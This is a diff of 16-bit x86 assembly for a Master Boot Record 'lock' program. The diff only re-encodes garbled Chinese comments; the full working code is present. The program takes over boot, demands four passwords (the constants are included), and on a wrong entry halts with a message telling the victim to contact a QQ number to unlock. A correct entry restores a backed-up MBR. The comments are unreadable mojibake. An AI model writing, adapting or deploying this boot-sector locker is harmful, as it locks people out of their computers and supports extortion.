@@ -1,31 +1,31 @@
 ;=================================================================
-;by yeluoQQ393925220 Ò¶ÂäËÄÖØËø
+;è¿™ä¸ªä»£ç å…ˆå ä¸ªä½ï¼Œæ–°é”èŠ¯è¿˜åœ¨å¼€å‘ä¸­ã€‚
 CPU 486
 BITS 16
         xor ebx,ebx
         mov ds,bx
-      mov ax,[0x413]           ;40:13,BIOSÊı¾İÇø±£´æ³£¹æµÄÄÚ´æ´óĞ¡,µ¥Î»:KBs.
-      and al,0xfc        ;ÒªÇó·ÖÅäµÄÎïÀíÄÚ´æµØÖ·,ÒÔÒ³×÷Îª»ùµØÖ·
+      mov ax,[0x413]           ;40:13,BIOSæ•°æ®åŒºä¿å­˜å¸¸è§„çš„å†…å­˜å¤§å°,å•ä½:KBs.
+      and al,0xfc        ;è¦æ±‚åˆ†é…çš„ç‰©ç†å†…å­˜åœ°å€,ä»¥é¡µä½œä¸ºåŸºåœ°å€
         sub ax,4
-        mov [0x413],ax           ;¿ª±ÙÒ»¶ÎÄÚ´æ£¬ÊµÏÖ³ÌĞòµÄ×¤Áô
-        shl ax,0x6               ;bx *= 1024 / 16 (KBs->ÏßĞÔµØÖ·=KBs*1024,¶Î:³ıÒÔ16)
-        mov es,ax                ;´æ´¢¶ÎµØÖ·
+        mov [0x413],ax           ;å¼€è¾Ÿä¸€æ®µå†…å­˜ï¼Œå®ç°ç¨‹åºçš„é©»ç•™
+        shl ax,0x6               ;bx *= 1024 / 16 (KBs->çº¿æ€§åœ°å€=KBs*1024,æ®µ:é™¤ä»¥16)
+        mov es,ax                ;å­˜å‚¨æ®µåœ°å€
 
-        mov si,0x7c00            ;¿½±´´úÂëµ½×¤ÁôÄÚ´æÖĞÖ´ĞĞ
-        xor di,di                ;Æ«ÒÆµØÖ·Îª0
-      mov cx,0x100             ;¿½±´512
+        mov si,0x7c00            ;æ‹·è´ä»£ç åˆ°é©»ç•™å†…å­˜ä¸­æ‰§è¡Œ
+        xor di,di                ;åç§»åœ°å€ä¸º0
+      mov cx,0x100             ;æ‹·è´512
         rep movsw
 
       mov ax,0x201
         mov cl,0x2
-        cdq                       ;Convert Double to Quad (386+)°ÑedxÀ©Õ¹ÎªeaxµÄ¸ßÎ»£¬Ò²¾ÍÊÇËµ±äÎª64Î»¡£
+        cdq                       ;Convert Double to Quad (386+)æŠŠedxæ‰©å±•ä¸ºeaxçš„é«˜ä½ï¼Œä¹Ÿå°±æ˜¯è¯´å˜ä¸º64ä½ã€‚
 
         push es
       push word password         
         retf                     
 ;=====================================================================     
 password:  
-    ;µÚÒ»²ãÃÜÂë   
+    ;ç¬¬ä¸€å±‚å¯†ç    
         MOV SI,ShowAuthorMessage
      CALL SHOWMESSAGE
      mov si,ShowEnterFMessage 
@@ -34,64 +34,64 @@ password:
      cmp cx,PassWordLength
 	 jne password
      je again
-again:                       ;µÚ¶ş²ãÃÜÂë
+again:                       ;ç¬¬äºŒå±‚å¯†ç 
      mov si,ShowEnterSMessage
      CALL SHOWMESSAGE
      CALL GETKEY
      cmp cx,Passwordsecond
 	 jne password
      je lasttime
-lasttime:                     ;µÚÈı²ã
+lasttime:                     ;ç¬¬ä¸‰å±‚
      mov si,ShowEnterTMessage
      call SHOWMESSAGE
      CALL GETKEY
      cmp cx,PassWordthird
 	 jne password
      je nextlasttime 
-nextlasttime:                     ;µÚËÄ²ã
+nextlasttime:                     ;ç¬¬å››å±‚
      mov si,ShowEnterLast 
      call SHOWMESSAGE
      CALL GETKEY
      cmp cx,PassWordlast 
      je bootloader
-wrong:                       ;µÚËÄ²ã´íÁËµÄ»°
+wrong:                       ;ç¬¬å››å±‚é”™äº†çš„è¯
      mov si,ShowByeBye
 	   CALL SHOWMESSAGE
      jmp $
-bootloader:                      ;Ğ£ÑéÃÜÂë³É¹¦£¬¿ªÊ¼µÇÂ½
+bootloader:                      ;æ ¡éªŒå¯†ç æˆåŠŸï¼Œå¼€å§‹ç™»é™†
  CALL SHOWMESSAGE
  mov si,ShowWelcome 
-   xor ax,ax ;³õÊ¼»¯
+   xor ax,ax ;åˆå§‹åŒ–
 	mov ax,0x7e00
 	mov es,ax
 	xor bx,bx
 	mov ah,0x2
 	mov dl,0x80
-	mov al,1  ;ÊıÁ¿
-	mov dh,0  ;´ÅÍ·
-	mov ch,0  ;ÖùÃæ  £»CHSÑ°Ö··½Ê½
-	mov cl,3  ;ÉÈÇø  £»
+	mov al,1  ;æ•°é‡
+	mov dh,0  ;ç£å¤´
+	mov ch,0  ;æŸ±é¢  ï¼›CHSå¯»å€æ–¹å¼
+	mov cl,3  ;æ‰‡åŒº  ï¼›
 	int 0x13
-	;Ğ´»ØÈ¥
+	;å†™å›å»
 	xor bx,bx
 	mov dl,0x80
 	mov ah,0x3
-	mov al,1  ;ÊıÁ¿
-	mov dh,0  ;´ÅÍ·
-	mov ch,0  ;ÖùÃæ
-	mov cl,1  ;MBRÉÈÇø
+	mov al,1  ;æ•°é‡
+	mov dh,0  ;ç£å¤´
+	mov ch,0  ;æŸ±é¢
+	mov cl,1  ;MBRæ‰‡åŒº
 	int 0x13
-	jmp reset;ÖØÆô¼ÆËã»ú
+	jmp reset;é‡å¯è®¡ç®—æœº
 ;======================================================================
 SHOWMESSAGE:    
-      mov ah,0Eh             ; ¹¦ÄÜ 0Eh: Êä³ö             
+      mov ah,0Eh             ; åŠŸèƒ½ 0Eh: è¾“å‡º             
 	 mov bx, 000ch                      
-     cs lodsb                                                  ; ¼ÓÔØµÚÒ»¸ö×Ö·û
+     cs lodsb                                                  ; åŠ è½½ç¬¬ä¸€ä¸ªå­—ç¬¦
 Next_Char:
      int 10h
-     cs lodsb                                        ; al = ÏÂ¸ö×Ö·û
-     or al,al                                        ; ÊÇ·ñÎª×îºóÒ»¸ö
-     jnz Next_Char                                   ; Èç¹ûÊÇÔò²»´òÓ¡ÏÂÒ»¸ö×Ö·û
+     cs lodsb                                        ; al = ä¸‹ä¸ªå­—ç¬¦
+     or al,al                                        ; æ˜¯å¦ä¸ºæœ€åä¸€ä¸ª
+     jnz Next_Char                                   ; å¦‚æœæ˜¯åˆ™ä¸æ‰“å°ä¸‹ä¸€ä¸ªå­—ç¬¦
 RETURNBACK:
      ret
 ;===========================================================
@@ -102,16 +102,16 @@ LOOP:
      INT 16H
      mov bl,al
      AND BX,0xFF
-     CMP AL,0DH                                  ;ÅĞ¶ÏÊÇ·ñEnter¼ü
+     CMP AL,0DH                                  ;åˆ¤æ–­æ˜¯å¦Enteré”®
      JZ RETURNBACK
-     ADD CX,bx                                   ;´æÈëCXÖĞ
+     ADD CX,bx                                   ;å­˜å…¥CXä¸­
      MOV AL,24H
      MOV BX,07H                        
      MOV AH,0EH
-     INT 10H                                      ;ÏÔÊ¾$ºÅ£¬¼ÌĞøµÈ´ıÊäÈë
+     INT 10H                                      ;æ˜¾ç¤º$å·ï¼Œç»§ç»­ç­‰å¾…è¾“å…¥
      JMP LOOP
 ;======================================================
-GETENTER:                                           ;ÅĞ¶ÏÊÇ·ñEnter¼ü£¬Èç¹ûÊÇÔò·µ»Ø£¬Èô²»ÊÇ¼ÌĞøµÈ´ıÊäÈë
+GETENTER:                                           ;åˆ¤æ–­æ˜¯å¦Enteré”®ï¼Œå¦‚æœæ˜¯åˆ™è¿”å›ï¼Œè‹¥ä¸æ˜¯ç»§ç»­ç­‰å¾…è¾“å…¥
      MOV AH,0
      INT 16H
      AND AX,0xFF
@@ -120,7 +120,7 @@ GETENTER:                                           ;ÅĞ¶ÏÊÇ·ñEnter¼ü£¬Èç¹ûÊÇÔò·µ
      RET
 ;=======================================================
 reset: 
-mov ax, 0ffffh           ; ÖØĞÂÆô¶¯¼ÆËã»ú£¬ÈÃ³ÌĞòÌø×ªµ½ FFFF:0 µ¥Ôª´¦Ö´ĞĞ
+mov ax, 0ffffh           ; é‡æ–°å¯åŠ¨è®¡ç®—æœºï¼Œè®©ç¨‹åºè·³è½¬åˆ° FFFF:0 å•å…ƒå¤„æ‰§è¡Œ
        push ax             
        mov ax, 0
        push ax
@@ -131,12 +131,12 @@ ShowEnterFMessage db   10, 13, "Enter first PassWord QAQ", 0
 ShowEnterSMessage db   10, 13, "Enter second password awa", 0
 ShowEnterTMessage db   10, 13, "Enter the third password qwq ", 0
 ShowEnterLast     db   10, 13, "Enter the last password @_@ ", 0
-PassWordLength    EQU 0XCEF ;¡°Ò¶Âäµ±¹é¸ù£¬ÔÆ³Á¾Ã±ØÆğ.
-Passwordsecond    EQU 0X1682 ;¡±ßóßó¸´ßóßó£¬Ä¾À¼µ±»§Ö¯£¬²»ÎÅ»úèÌÉù£¬Î©ÎÅÅ®Ì¾Ï¢¡£
+PassWordLength    EQU 0XCEF ;â€œå¶è½å½“å½’æ ¹ï¼Œäº‘æ²‰ä¹…å¿…èµ·.
+Passwordsecond    EQU 0X1682 ;â€å”§å”§å¤å”§å”§ï¼Œæœ¨å…°å½“æˆ·ç»‡ï¼Œä¸é—»æœºæ¼å£°ï¼ŒæƒŸé—»å¥³å¹æ¯ã€‚
 PassWordthird     EQU 0XAC4 ; yeluo520yeluo4588fanchenyeluo
 PassWordlast      EQU 0X41 ;  
 ShowByeBye        db   10, 13, "jiesuo+QQ393925220 steal my lock sima", 0
-ShowWelcome     db   10, 13, "The password is correct!£¬Thanks£¡", 0
+ShowWelcome     db   10, 13, "The password is correct!ï¼ŒThanksï¼", 0
 ;=================================================================
-times 510-($-$$) db 0X0                    ;Ìî³ä00h
+times 510-($-$$) db 0X0                    ;å¡«å……00h
 Boot_Signature            dw 0AA55h
